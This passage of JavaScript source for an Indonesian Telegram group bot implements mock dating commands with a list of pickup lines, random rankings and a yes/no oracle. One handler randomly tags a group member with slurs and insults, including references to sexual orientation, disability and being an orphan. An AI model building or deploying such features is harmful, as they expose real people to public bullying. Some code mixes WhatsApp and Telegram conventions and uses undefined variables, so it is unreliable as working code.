if (msg.text?.startsWith(`${prefix}tembak`) || msg.text?.startsWith(`${prefix}jadian`)) {
  if (!msg.isGroup) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ᴄᴏᴍᴍᴀɴᴅ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ɢʀᴜᴘ!</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  // Cara ambil user yang ditag atau direply (format TELEGRAM)
  let user = null;
  
  // Cek dari mentionUsers (Telegram)
  if (msg.mentionUsers && msg.mentionUsers.length > 0) {
    user = msg.mentionUsers[0];
  }
  // Cek dari replyTo
  else if (msg.replyTo && msg.replyTo.sender) {
    user = msg.replyTo.sender;
  }
  // Cek dari text manual
  else {
    let match = msg.text.match(/@(\w+)/);
    if (match) {
      user = match[1];
    }
  }
  
  if (!user) {
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>⚠️ ᴛᴀɢ/ʀᴇᴘʟʏ ꜱᴇꜱᴇᴏʀᴀɴɢ!\n\nᴄᴏɴᴛᴏʜ: ${prefix}tembak @ᴜꜱᴇʀ</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id 
    });
    return;
  }
  
  if (user === msg.sender) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>😓 ʜᴀʟᴀʜ ᴍᴀᴜɴʏᴀ ᴊᴀᴅɪᴀɴ ꜱᴀᴍᴀ ᴅɪʀɪ ꜱᴇɴᴅɪʀɪ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  if (user === botNumber) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>😓 ᴀᴋᴜ ʜᴀɴʏᴀ ꜱᴇʙᴜᴀʜ ʙᴏᴛ ᴍᴀᴀꜰ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  sock.jadian = sock.jadian || {};
  let pasangan = db.users[user]?.pacar;
  let pasangan2 = db.users[msg.sender]?.pacar;
  
  if (pasangan2 === user) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>😤 ᴋᴀᴍᴜ ᴋᴀɴ ᴜᴅᴀʜ ᴊᴀᴅɪᴀɴ ꜱᴍᴀᴀ ᴅɪᴀ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  if (pasangan) {
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>😔😭 ᴛᴀʀɢᴇᴛ ᴜᴅᴀʜ ᴘᴜɴʏᴀ ᴘᴀᴄᴀʀ\n\n@${pasangan.split("@")[0]} ᴀʏᴀɴɢᴍᴜ ᴍᴏ ᴅɪᴀᴍʙɪʟ</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id,
      mentions: [pasangan]
    });
    return;
  }
  
  if (pasangan2) {
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>😔 ʜᴀʏᴏʟᴏᴏ ᴍᴀᴜ ꜱᴇʟɪɴɢᴋᴜʜ\n\n@${pasangan2.split("@")[0]} ᴛᴇɴɢᴏᴋ ɴɪʜʜ ᴋᴇʟᴀᴋᴜᴀɴ ᴀʏᴀɴɢᴍᴜ</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id,
      mentions: [pasangan2]
    });
    return;
  }
  
  const ktnmbk = [
    "Ada saat di mana aku nggak suka sendiri. Tapi aku juga nggak mau semua orang menemani, hanya kamu yang kumau.",
    "Aku baru sadar ternyata selama ini kamu kaya! Kaya yang aku cari selama ini. Kamu mau nggak jadi pacarku?",
    "Aku berterima kasih pada mataku, sebab mata inilah yang menuntunku untuk menemukanmu.",
    "Aku boleh kirim CV ke kamu nggak? Soalnya aku mau ngelamar jadi pacar.",
    "Aku bukan yang terhebat, namun aku yakin kalau aku mampu membahagiakanmu dengan bermodalkan cinta dan kasih sayang, kamu mau kan denganku?",
    "Aku hanya cowok biasa yang memiliki banyak kekurangan dan mungkin tak pantas mengharapkan cintamu, namun jika kamu bersedia menerimaku menjadi kekasih, aku berjanji akan melakukan apa pun yang terbaik untukmu. Maukah kamu menerima cintaku?",
    "Aku ingin bilang sesuatu. Udah lama aku suka sama aku, tapi aku nggak berani ngomong. Jadi, kuputuskan untuk WA saja. Aku pengin kamu jadi pacarku.",
    "Aku ingin mengungkapkan sebuah hal yang tak sanggup lagi aku pendam lebih lama. Aku mencintaimu, maukah kamu menjadi pacarku?",
    "Aku ingin menjadi orang yang bisa membuatmu tertawa dan tersenyum setiap hari. Maukah kau jadi pacarku?",
    "Aku mau chat serius sama kamu. Selama ini aku memendam rasa ke kamu dan selalu memperhatikanmu. Kalau nggak keberatan, kamu mau jadi pacarku?",
    "Aku melihatmu dan melihat sisa hidupku di depan mataku.",
    "Aku memang tidak mempunyai segalanya, tapi setidaknya aku punya kasih sayang yang cukup buat kamu.",
    "Aku menyukaimu dari dulu. Kamu begitu sederhana, tetapi kesederhanaan itu sangat istimewa di selaput mataku. Akan sempurna jika kamu yang menjadi spesial di hati.",
    "Aku naksir banget sama kamu. Maukah kamu jadi milikku?",
    "Aku nggak ada ngabarin kamu bukan karena aku gak punya kuota atau pulsa, tapi lagi menikmati rasa rindu ini buat kamu. Mungkin kamu akan kaget mendengarnya. Selama ini aku menyukaimu.",
    "Aku nggak pengin kamu jadi matahari di hidupku, karena walaupun hangat, kamu sangat jauh. Aku juga nggak mau kamu jadi udara, karena walaupun aku butuh dan kamu sangat dekat, tapi semua orang juga bisa menghirupmu. Aku hanya ingin kamu jadi darah yang bisa sangat dekat denganku.",
    "Aku nggak tahu sampai kapan usiaku berakhir. Yang aku tahu, cintaku ini selamanya hanya untukmu.",
    "Aku sangat menikmati waktu yang dihabiskan bersama hari ini. Kita juga sudah lama saling mengenal. Di hari yang cerah ini, aku ingin mengungkapkan bahwa aku mencintaimu.",
    "Aku selalu membayangkan betapa indahnya jika suatu saat nanti kita dapat membina bahtera rumah tangga dan hidup bersama sampai akhir hayat. Namun, semua itu tak mungkin terjadi jika kita berdua sampai saat ini bahkan belum jadian. Maukah kamu menjadi kekasihku?",
    "Aku siapkan mental untuk hari ini. Kamu harus menjadi pacarku untuk mengobati rasa cinta yang sudah tak terkendali ini.",
    "Aku tahu kita gak seumur, tapi bolehkan aku seumur hidup sama kamu?",
    "Aku tahu kita sudah lama sahabatan. Tapi nggak salah kan kalau aku suka sama kamu? Apa pun jawaban kamu aku terima. Yang terpenting itu jujur dari hati aku yang terdalam.",
    "Aku tak bisa memulai ini semua terlebih dahulu, namun aku akan berikan sebuah kode bahwa aku menyukai dirimu. Jika kau mengerti akan kode ini maka kita akan bersama.",
    "Aku yang terlalu bodoh atau kamu yang terlalu egois untuk membuat aku jatuh cinta kepadamu.",
    "Apa pun tentangmu, tak pernah ku temukan bosan di dalamnya. Karena berada di sampingmu, anugerah terindah bagiku. Jadilah kekasihku, hey kamu.",
    "Atas izin Allah dan restu mama papa, kamu mau nggak jadi pacarku?",
    "Bagaimana kalau kita jadi komplotan pencuri? Aku mencuri hatimu dan kau mencuri hatiku.",
    "Bahagia itu kalau aku dan kamu telah menjadi kita.",
    "Besok kalau udah nggak gabut, boleh nggak aku daftar jadi pacar kamu. Biar aku ada kerjaan buat selalu mikirin kamu.",
    "Biarkan aku membuatmu bahagia selamanya. Kamu hanya perlu melakukan satu hal: Jatuh cinta denganku.",
    "Biarkan semua kebahagiaanku menjadi milikmu, semua kesedihanmu menjadi milikku. Biarkan seluruh dunia menjadi milikmu, hanya kamu yang menjadi milikku!",
    "Biarlah yang lalu menjadi masa laluku, namun untuk masa kini maukah kamu menjadi masa depanku?",
    "Bisakah kamu memberiku arahan ke hatimu? Sepertinya aku telah kehilangan diriku di matamu.",
    "Bukanlah tahta ataupun harta yang aku cari, akan tetapi balasan cintaku yang aku tunggu darimu. Dijawab ya.",
    "Caramu bisa membuatku tertawa bahkan di hari-hari tergelap membuatku merasa lebih ringan dari apa pun. Aku mau kamu jadi milikku.",
    "Cinta aku ke kamu itu jangan diragukan lagi karena cinta ini tulus dari lubuk hati yang paling dalam.",
    "Cintaku ke kamu tuh kayak angka 5 sampai 10. Nggak ada duanya. Aku mau kamu jadi satu-satunya wanita di hatiku.",
    "Cowok mana yang berani-beraninya nyakitin kamu. Sini aku obati, asal kamu mau jadi pacar aku.",
    "Hai, kamu lagi ngapain? Coba deh keluar rumah dan lihat bulan malam ini. Cahayanya indah dan memesona, tapi akan lebih indah lagi kalau aku ada di sampingmu. Gimana kalau kita jadian, supaya setelah malam ini bisa menatap rembulan sama-sama?",
    "Hidupku indah karena kamu bersamaku, kamu membuatku bahagia bahkan jika aku merasa sedih dan rendah. Senyummu menerangi hidupku dan semua kegelapan menghilang. Maukah kamu menjadi milikku?",
    "Ini bukan rayuan, tapi ini yang aku rasakan. Aku ingin bertukar tulang denganmu. Aku jadi tulang punggungmu, kamu jadi tulang rusukku. Jadian yuk!",
    "Ini cintaku, ambillah. Ini jiwaku, gunakan itu. Ini hatiku, jangan hancurkan. Ini tanganku, pegang dan bersama-sama kita akan membuatnya abadi.",
    "Izinkan aku mengatakan sesuatu yang menurutku sangat penting. Hey, kau punya tempat di hatiku yang tidak bisa dimiliki oleh orang lain. Tetaplah di sana dan jadilah kekasihku. Mau?",
    "Jika aku bisa memberimu hadiah, aku akan memberimu cinta dan tawa, hati yang damai, mimpi dan kegembiraan khusus selamanya. Biarkan aku melakukannya sekarang.",
    "Kalau aku matahari, kamu mau nggak jadi langitku? Biar setiap saat setiap waktu bisa selalu bersama tanpa terpisah waktu.",
    "Kalau kamu membuka pesan ini, berarti kamu suka sama aku. Kalau kamu membalas pesan ini, artinya kamu sayang sama aku. Kalau kamu mengabaikan pesan ini, berarti kamu cinta sama aku. Kalau kamu menghapus pesan ini, artinya kamu mau menerimaku jadi pacarmu.",
    "Kalau kau bertanya-tanya apakah aku mencintaimu atau tidak, jawabannya adalah iya.",
    "Kamu adalah satu-satunya yang lebih mengerti aku daripada diriku sendiri. Kamu adalah satu-satunya yang dapat ku bagi segalanya, bahkan rahasia pribadiku. Aku ingin kamu selalu bersamaku. Aku mencintaimu.",
    "Kamu harus membiarkan aku mencintaimu, biarkan aku menjadi orang yang memberimu semua yang kamu inginkan dan butuhkan.",
    "Kamu itu beda dari cewek lain, kamu antik jarang ditemukan di tempat lain. Maukah kamu jadi pacar aku?",
    "Kamu kenal Iwan nggak? Iwan to be your boy friend.",
    "Kamu mau nggak jadi matahari di kehidupanku? Kalau mau, menjauhlah 149.6 juta KM dari aku sekarang!",
    "Kamu nggak capek HTS-an sama aku? Aku capek tiap hari jemput kamu, nemenin kamu pas lagi bad mood, menghibur kamu pas lagi sedih. Kita pacaran aja, yuk?",
    "Kamu nggak sadar ya, nggak perlu capek nyari kesana kemari, orang yang tulus mencintai kamu ada di depan mata. Iya, aku.",
    "Kamu pantas mendapatkan yang terbaik, seseorang yang akan mendukungmu tanpa batas, membiarkanmu tumbuh tanpa batas, dan mencintaimu tanpa akhir. Apakah kamu akan membiarkan aku menjadi orangnya?",
    "Kamu tahu enggak kenapa aku ngambil jurusan elektro? Karena aku mau bikin pembangkit listrik tenaga cinta kita, supaya rumah tangga kita nanti paling terang.",
    "Kamu tahu kenapa hari ini aku menyatakan semua ini padamu? Karena aku lebih memilih untuk malu karena menyatakan cinta ditolak ketimbang menyesal karena orang lain yang lebih dulu menyatakannya.",
    "Kamu telah hidup dalam mimpiku untuk waktu yang lama, bagaimana jika menjadikannya nyata untuk sekali saja?",
    "Kenapa aku baru sadar, ternyata selama ini hatiku nyaman bersanding denganmu. Aku mau kamu jadi milikku.",
    "Ketika aku bertemu denganmu, aku tak peduli dengan semuanya. Namun, ketika kamu pergi jauh dariku aku selalu mengharapkanmu. Dan apakah ini cinta?",
    "Ketika engkau memandangku, engkau akan melihat fisikku. Tetapi ketika engkau melihat hatiku, engkau akan menemukan dirimu sendiri ada di sana.",
    "Ketika Hawa tercipta buat sang Adam, begitu indah kehidupan mereka izinkan aku menjadi sang Adam/Hawa buatmu karena aku sangat mencintaimu.",
    "Ketika mata ini memandang raut wajahmu yang indah, hanya tiga kata yang terucap dari lubuk hatiku yang paling dalam 'aku cinta kamu'.",
    "Kita udah saling tahu masa lalu masing-masing. Tapi itu tidak penting karena sekarang aku hanya ingin membicarakan tentang masa depan. Mulai hari ini dan seterusnya, maukah kamu menjadi pacarku?",
    "Ku beranikan hari ini untuk mengungkapkan yang selama ini menjadi resah. Resah jika kamu tak menjadi milikku selamanya.",
    "Lebih spesial dari nasi goreng, lebih indah dari purnama. Ya, jika kamu yang temani akhir hidupku.",
    "Maaf sebelumnya karena cuma bisa bilang lewat WA. Sebenarnya, selama ini aku memendam cinta dan aku ingin kamu jadi pacarku. Mau?",
    "Makanan busuk memanglah bau, kalau dimakan rasanya pahit sepahit jamu. Sebenarnya aku ingin kamu tahu, aku mau kamu terima cintaku.",
    "Makan tahu bumbu petis. Merenung sambil makan buah duku. Aku bukan lelaki yang romantis. Namun, maukah kau jadi pacarku?",
    "Makasih, ya, selama ini sudah mau temani aku. Entah itu dalam suka ataupun duka. Tapi sekarang aku mau kamu berubah. Aku mau kamu bukan lagi jadi temanku, tapi aku mau kamu jadi pacarku.",
    "Malam ini sangat indah dengan cahaya rembulan yang memesona namun akan lebih indah kalau kamu resmi menjadi milikku.",
    "Mataku mencarimu ketika kamu tidak ada. Hatiku sakit ketika aku tidak menemukanmu. Kamu adalah alasan untuk semua kebahagiaanku dan tanpamu hidupku akan sangat membosankan. Maukah kamu terus bersamaku?",
    "Mau jadi pacarku nggak, lagi gabut nih. Coba dulu 1 bulan kalau nyaman lanjut deh.",
    "Menjadi teman memang menyenangkan. Akan lebih membahagiakan jika kamu menjadi milikku.",
    "Meski jarang buat kamu tertawa, setidaknya saya tidak selalu buat kamu sedih. Tapi kalau akhirnya humor saya tidak membuatmu tertawa lagi, semoga sedih saya bisa kamu tertawakan, ya.",
    "Meskipun aku memiliki banyak hal untuk dikatakan, tetapi kata-kataku bersembunyi dariku dan aku tidak bisa mengungkapkannya. Hal sederhana yang ingin aku katakan adalah aku mencintaimu hari ini dan selalu.",
    "Mungkin aku bukan Obama, tapi aku senang kalau bisa manggil kamu, o sayang. Kamu mau nggak mulai saat ini aku panggil seperti itu?",
    "Mungkin aku tak sanggup menyeberangi lautan, menghantam karang atau menerjang badai. Tapi satu yang aku sanggup, membuatmu bahagia. Izinkan aku membuktikannya, ya!",
    "Neng, bakar-bakaran yuk! | Bakar apa? | Kita bakar masa lalu dan buka lembaran baru dengan cinta kita.",
    "Nggak perlu basa basi. Kita udah kenal lama, aku suka kamu apa adanya. Jadian yuk!",
    "Pepatah mengatakan, empat sehat lima sempurna. Namun, aku tidak merasakan kesempurnaan itu sebelum aku merasakan kasih sayangmu.",
    "Saatnya aku mengungkapkan perasaan yang terdalam kepadamu. Aku ingin kamu tahu bahwa aku mencintaimu seperti aku tidak pernah mencintai siapa pun sebelumnya.",
    "Saking jatuh cintanya aku sama kamu. Mendengar kamu kentut aja aku sudah bahagia.",
    "Satu tambah satu sama dengan dua. Aku tanpamu nggak bisa apa-apa. Satu dua tiga sepuluh. Aku maunya kamu jadi pacarkuh.",
    "Secantik-canriknya kamu, itu nggak ada gunanya kalau nggak jadi punyaku.",
    "Sejak kenal kamu, bawaannya pengin belajar terus. Belajar jadi yang terbaik. Untuk selanjutnya, kamu mau nggak ngebimbing aku, selalu ada di sampingku?",
    "Senjata bertuah amatlah sakti. Kalah oleh iman nan hakiki. Maukah kau jadi orang yang aku kasihi? Aku janji cintaku sampai mati.",
    "Seseorang bermimpi tentangmu setiap malam. Seseorang tidak bisa bernapas tanpamu, kesepian. Seseorang berharap suatu hari kau akan melihatnya. Seseorang itu adalah aku.",
    "Setelah hari berlalu, aku yakin kamu pilihanku.",
    "Setelah sekian lama bersama, aku ingin kita tidak hanya sekadar teman saja. Aku yakin kamu paham maksudku, dan aku berharap semoga kamu setuju. Aku mencintaimu.",
    "Suatu ketika, ada seorang laki-laki yang mencintai perempuan yang tawanya bagaikan sebuah pertanyaan yang seumur hidup ingin dijawabnya. Akulah laki-laki itu, seorang laki-laki yang sedang menginginkan perempuan untuk jawaban di hidupnya. Perempuan itu adalah kamu.",
    "Suka maupun duka, senang maupun susah, kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu karena aku mau kamu jadi pacar aku?",
    "Tak ada alasan yang pasti dan jelas kenapa aku cinta kamu, tapi yang pasti aku menginginkan aku bahagia denganmu dan tak ingin sampai kamu terluka.",
    "Tak bisa dibayangkan jika di dunia ini tak ada yang namanya cinta. Ya, rasa cinta bagi sebagian orang memberi keindahan yang membuat hari-hari semakin berwarna. Apalagi jika perasaan cinta yang kita punya dibalas oleh orang yang kita suka.",
    "Tak hanya menyenangkan, aku yakin kamu dapat diandalkan di masa depan.",
    "Tak ragu lagi untuk ungkapkan kepada seseorang yang ada di hati. Itu adalah kamu.",
    "Telah banyak waktuku terlewati bersamamu, suka maupun duka senang maupun susah kamu telah menghiasi hariku saat aku bersamamu dan aku mau kita selamanya dekat denganmu. Karena aku mau kamu jadi pacar aku?",
    "Tidak peduli seberapa sederhanya dan ketidakjelasan kamu. Tapi bagi aku, kamu adalah kesempurnaan yang memiliki kejelasan. Aku mau kamu jadi pacarku.",
    "Untuk apa memajang foto berdua? Yang aku mau fotomu ada dalam buku nikahku kelak. Maukah kamu jadi pacarku?"
  ];
  
  const katakata = ktnmbk[Math.floor(Math.random() * ktnmbk.length)];
  
  sock.jadian[user] = [msg.sender];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>💕 *ʟᴏᴠᴇ ᴍᴇꜱꜱᴀɢᴇ...* 💕\n\n@${msg.sender.split("@")[0]} ❤️ @${user.split("@")[0]}\n\n"${katakata}"</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id,
    mentions: [msg.sender, user]
  });
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>💌 ᴋᴀᴍᴜ ʙᴀʀᴜ ꜱᴀᴊᴀ ᴍᴇɴɢᴀᴊᴀᴋ @${user.split("@")[0]} ᴊᴀᴅɪᴀɴ\n\n@${user.split("@")[0]} ꜱɪʟᴀʜᴋᴀɴ ʙᴇʀɪ ᴋᴇᴘᴜᴛᴜꜱᴀɴ 🎉\n\n${prefix}ᴛᴇʀɪᴍᴀ\n${prefix}ᴛᴏʟᴀᴋ</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id,
    mentions: [user]
  });
  return;
}

// Case terima
if (msg.text?.startsWith(`${prefix}terima`)) {
  if (!msg.isGroup) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ᴄᴏᴍᴍᴀɴᴅ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ɢʀᴜᴘ!</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  if (sock.jadian && sock.jadian[msg.sender]) {
    let user = sock.jadian[msg.sender][0];
    db.users[user].pacar = msg.sender;
    db.users[msg.sender].pacar = user;
    
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>🎉 ʜᴏʀᴇᴇᴇ 🎉\n\n@${msg.sender.split("@")[0]} ᴊᴀᴅɪᴀɴ ᴅᴇɴɢᴀɴ\n❤️ @${user.split("@")[0]} ❤️\n\nꜱᴇᴍᴏɢᴀ ʟᴀɴɢɢᴇɴɢ 🥳🙂</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id,
      mentions: [msg.sender, user]
    });
    
    delete sock.jadian[msg.sender];
  } else {
    await client.sendMessage(msg.chatId, { message: `<blockquote>😒 ɪʜʜ ᴋᴀɢᴀ ᴀᴅᴀ ʏᴀɴɢ ɴᴇᴍʙᴀᴋ ᴋᴀᴍᴜ</blockquote>`, parseMode: "html", replyTo: msg.id });
  }
  return;
}

// Case tolak
if (msg.text?.startsWith(`${prefix}tolak`)) {
  if (!msg.isGroup) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ᴄᴏᴍᴍᴀɴᴅ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ɢʀᴜᴘ!</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  if (sock.jadian && sock.jadian[msg.sender]) {
    let user = sock.jadian[msg.sender][0];
    
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>😓 @${user.split("@")[0]} ᴅɪᴛᴏʟᴀᴋ ɴᴊɪʀ</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id,
      mentions: [user]
    });
    
    delete sock.jadian[msg.sender];
  } else {
    await client.sendMessage(msg.chatId, { message: `<blockquote>😒 ᴅɪʜʜ ʟᴜ ɴᴏʟᴀᴋ ꜱɪᴀᴘᴀ, ꜱᴇᴛᴀɴ?</blockquote>`, parseMode: "html", replyTo: msg.id });
  }
  return;
}

// Case putus
if (msg.text?.startsWith(`${prefix}putus`)) {
  if (!msg.isGroup) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ᴄᴏᴍᴍᴀɴᴅ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ɢʀᴜᴘ!</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  let pasangan = db.users[msg.sender]?.pacar;
  
  if (pasangan) {
    db.users[msg.sender].pacar = "";
    db.users[pasangan].pacar = "";
    
    await client.sendMessage(msg.chatId, { 
      message: `<blockquote>😓🤔 ᴋᴀᴍᴜ ᴘᴜᴛᴜꜱ ꜱᴀᴍᴀ @${pasangan.split("@")[0]}</blockquote>`, 
      parseMode: "html", 
      replyTo: msg.id,
      mentions: [pasangan]
    });
  } else {
    await client.sendMessage(msg.chatId, { message: `<blockquote>😒 ᴋᴀᴍᴜ ᴊᴏᴍʙʟᴏ ɴɢᴀᴘᴀɪɴ ᴘᴜᴛᴜꜱ ɴᴊɪʀ</blockquote>`, parseMode: "html", replyTo: msg.id });
  }
  return;
}

// Case cekpacar / cekpasangan
if (msg.text?.startsWith(`${prefix}cekpacar`) || msg.text?.startsWith(`${prefix}cekpasangan`)) {
  if (!msg.isGroup) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ᴄᴏᴍᴍᴀɴᴅ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ɢʀᴜᴘ!</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  try {
    let user = null;
    
    if (msg.mentionUsers && msg.mentionUsers.length > 0) {
      user = msg.mentionUsers[0];
    } else if (msg.replyTo && msg.replyTo.sender) {
      user = msg.replyTo.sender;
    } else {
      let match = msg.text.match(/@(\w+)/);
      if (match) {
        user = match[1];
      }
    }
    
    if (!user) {
      await client.sendMessage(msg.chatId, { 
        message: `<blockquote>⚠️ ᴛᴀɢ/ʀᴇᴘʟʏ ꜱᴇꜱᴇᴏʀᴀɴɢ!\n\nᴄᴏɴᴛᴏʜ: ${prefix}cekpacar @ᴜꜱᴇʀ</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id 
      });
      return;
    }
    
    let pasangan = db.users[user]?.pacar;
    
    if (pasangan) {
      await client.sendMessage(msg.chatId, { 
        message: `<blockquote>❤️ @${user.split("@")[0]} ᴜᴅᴀʜ ᴘᴀᴄᴀʀᴀɴ ꜱᴀᴍᴀ @${pasangan.split("@")[0]} ❤️</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id,
        mentions: [user, pasangan]
      });
    } else {
      await client.sendMessage(msg.chatId, { 
        message: `<blockquote>😎 @${user.split("@")[0]} ᴍᴀꜱɪʜ ᴊᴏᴍʙʟᴏ ᴛᴜʜ 🥳</blockquote>`, 
        parseMode: "html", 
        replyTo: msg.id,
        mentions: [user]
      });
    }
  } catch (error) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>😞 ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴅɪᴅᴀʟᴀᴍ ᴅᴀᴛᴀʙᴀꜱᴇ</blockquote>`, parseMode: "html", replyTo: msg.id });
  }
  return;
}
// Case top
if (msg.text?.startsWith(`${prefix}top`)) {
  if (!msg.isGroup) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ᴄᴏᴍᴍᴀɴᴅ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ɢʀᴜᴘ!</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const kategori = msg.text.split(" ").slice(1).join(" ");
  
  if (!kategori) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴘᴇɴɢɢᴜɴᴀᴀɴ ${command} [ᴋᴀᴛᴇɢᴏʀɪ]\n\nᴄᴏɴᴛᴏʜ: ${command} ᴏʀᴀɴɢ ᴘɪɴᴛᴀʀ</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  let member = participants.map(u => u.jid).filter(v => v !== sock.user.jid);
  let top5 = [];
  
  for (let i = 0; i < 5; i++) {
    top5.push(member[Math.floor(Math.random() * member.length)]);
  }
  
  let mention = top5.map((user, index) => `${index + 1}. @${user.split('@')[0]}`).join('\n');
  
  await client.sendMessage(msg.chatId, {
    message: `<blockquote>☟ ᴛᴏᴘ 5 ${kategori} ☟\n\n${mention}</blockquote>`,
    parseMode: "html",
    replyTo: msg.id,
    mentions: top5
  });
  return;
}

// Case bego, goblok, janda, dll
if (msg.text?.startsWith(`${prefix}bego`) || msg.text?.startsWith(`${prefix}goblok`) || msg.text?.startsWith(`${prefix}janda`) || 
    msg.text?.startsWith(`${prefix}perawan`) || msg.text?.startsWith(`${prefix}babi`) || msg.text?.startsWith(`${prefix}tolol`) || 
    msg.text?.startsWith(`${prefix}pekok`) || msg.text?.startsWith(`${prefix}jancok`) || msg.text?.startsWith(`${prefix}pinter`) || 
    msg.text?.startsWith(`${prefix}pintar`) || msg.text?.startsWith(`${prefix}asu`) || msg.text?.startsWith(`${prefix}bodoh`) || 
    msg.text?.startsWith(`${prefix}gay`) || msg.text?.startsWith(`${prefix}lesby`) || msg.text?.startsWith(`${prefix}bajingan`) || 
    msg.text?.startsWith(`${prefix}anjing`) || msg.text?.startsWith(`${prefix}anjg`) || msg.text?.startsWith(`${prefix}anjj`) || 
    msg.text?.startsWith(`${prefix}anj`) || msg.text?.startsWith(`${prefix}ngentod`) || msg.text?.startsWith(`${prefix}ngentot`) || 
    msg.text?.startsWith(`${prefix}monyet`) || msg.text?.startsWith(`${prefix}mastah`) || msg.text?.startsWith(`${prefix}newbie`) || 
    msg.text?.startsWith(`${prefix}bangsat`) || msg.text?.startsWith(`${prefix}bangke`) || msg.text?.startsWith(`${prefix}sange`) || 
    msg.text?.startsWith(`${prefix}sangean`) || msg.text?.startsWith(`${prefix}dakjal`) || msg.text?.startsWith(`${prefix}horny`) || 
    msg.text?.startsWith(`${prefix}wibu`) || msg.text?.startsWith(`${prefix}puki`) || msg.text?.startsWith(`${prefix}puqi`) || 
    msg.text?.startsWith(`${prefix}peak`) || msg.text?.startsWith(`${prefix}pantex`) || msg.text?.startsWith(`${prefix}pantek`) || 
    msg.text?.startsWith(`${prefix}setan`) || msg.text?.startsWith(`${prefix}iblis`) || msg.text?.startsWith(`${prefix}cacat`) || 
    msg.text?.startsWith(`${prefix}yatim`) || msg.text?.startsWith(`${prefix}piatu`)) {
  
  if (!msg.isGroup) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>❌ ᴄᴏᴍᴍᴀɴᴅ ɪɴɪ ʜᴀɴʏᴀ ᴜɴᴛᴜᴋ ɢʀᴜᴘ!</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  let member = participants.map(u => u.jid).filter(v => v !== sock.user.jid);
  let org = member[Math.floor(Math.random() * member.length)];
  let command = msg.text.split(" ")[0].replace(prefix, "");
  
  await client.sendMessage(msg.chatId, {
    message: `<blockquote>ᴀɴᴀᴋ ${command} ᴅɪ ꜱɪɴɪ ᴀᴅᴀʟᴀʜ @${org.split('@')[0]}</blockquote>`,
    parseMode: "html",
    replyTo: msg.id,
    mentions: [org]
  });
  return;
}

// Case apakah
if (msg.text?.startsWith(`${prefix}apakah`)) {
  const text = msg.text.replace(`${prefix}apakah`, "").trim();
  
  if (!text) {
    await client.sendMessage(msg.chatId, { message: `<blockquote>⚠️ ᴄᴏɴᴛᴏʜ: ${prefix}apakah ꜱᴀʏᴀ ɢᴀɴᴛᴇɴɢ?</blockquote>`, parseMode: "html", replyTo: msg.id });
    return;
  }
  
  const jawaban = ['Iʏᴀ', 'Mᴜɴɢᴋɪɴ ɪʏᴀ', 'Mᴜɴɢᴋɪɴ', 'Gᴀᴋ', 'Mᴜɴɢᴋɪɴ ɢᴀᴋ', 'Gᴀᴋ ᴛᴀᴜ'];
  const coli = jawaban[Math.floor(Math.random() * jawaban.length)];
  
  await client.sendMessage(msg.chatId, { 
    message: `<blockquote>📝 *ᴘᴇʀᴛᴀɴʏᴀᴀɴ:* ᴀᴘᴀᴋᴀʜ ${text}\n💬 *ᴊᴀᴡᴀʙᴀɴ:* ${coli}</blockquote>`, 
    parseMode: "html", 
    replyTo: msg.id 
  });
  return;
}

// ############# ANIME
if (msg.text?.startsWith(`${prefix}akiyama`) || msg.text?.startsWith(`${prefix}ana`) || msg.text?.startsWith(`${prefix}art`) || 
    msg.text?.startsWith(`${prefix}asuna`) || msg.text?.startsWith(`${prefix}ayuzawa`) || msg.text?.startsWith(`${prefix}boruto`) || 
    msg.text?.startsWith(`${prefix}bts`) || msg.text?.startsWith(`${prefix}cartoon`) || msg.text?.startsWith(`${prefix}chiho`) || 
    msg.text?.startsWith(`${prefix}chitoge`) || msg.text?.startsWith(`${prefix}cosplay`) || msg.text?.startsWith(`${prefix}cosplayloli`) || 
